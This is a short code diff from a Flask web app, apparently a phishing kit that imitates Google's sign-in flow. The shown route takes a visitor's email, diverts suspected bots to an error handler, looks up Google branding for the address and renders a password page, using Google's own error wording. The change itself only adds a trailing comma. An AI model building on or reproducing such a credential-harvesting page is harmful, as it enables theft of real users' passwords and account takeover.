@@ -303,7 +303,7 @@ def submit_email():
             return redirect(url_for('bot_error_handler'))
         session['email'] = email
         branding = get_google_email_details(email)
-        return render_template('password.html', email=email, branding=branding)
+        return render_template('password.html', email=email, branding=branding,)
     return render_template('index.html', error="Enter an email or phone number.")
 
 # Update password route to new name for password entry and authentication
